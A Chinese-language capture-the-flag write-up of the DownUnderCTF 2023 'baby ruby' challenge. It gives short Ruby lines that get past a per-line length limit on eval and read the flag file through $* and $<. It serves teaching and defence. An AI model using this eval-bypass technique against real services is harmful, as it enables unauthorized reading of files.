# DownUnderCTF 2023 baby ruby Writeup

## 题目简述

服务循环读取输入，只要单行长度小于 5 字符就交给 Ruby `eval`。flag 位于 `/chal/flag`。单行限制阻止直接写出文件读取表达式，但所有行都在同一个绑定中执行，因此可以分多步保存对象和字符串。

## 解题过程

Ruby 的 `?x` 可以在很短的表达式中得到单字符字符串，`<<` 可以原地追加。先逐字符构造路径：

```ruby
A=''
B=?/
A<<B
B=?c
A<<B
B=?h
A<<B
B=?a
A<<B
B=?l
A<<B
B=?/
A<<B
B=?f
A<<B
B=?l
A<<B
B=?a
A<<B
B=?g
A<<B
```

此时 `A == "/chal/flag"`。Ruby 的特殊全局变量 `$*` 是 `ARGV`，`$<` 是 `ARGF`。把路径追加到 `ARGV` 后，`ARGF` 会把它当作输入文件；最后通过参数展开把全部行交给 `p`：

```ruby
C=$*
C<<A
D=$<
p *D
```

每一行都少于 5 个字符，输出为：

```text
DUCTF{how_to_pwn_ruby_in_four_easy_steps}
```

## 方法总结

长度限制只约束单次输入，不能阻止跨行积累状态。Ruby 的字符字面量、原地字符串拼接和 `$*`、`$<` 等短全局变量让攻击者无需调用长方法名就能完成文件读取。安全实现不应对不可信输入使用 `eval`，更不能把字符数限制当作沙箱。
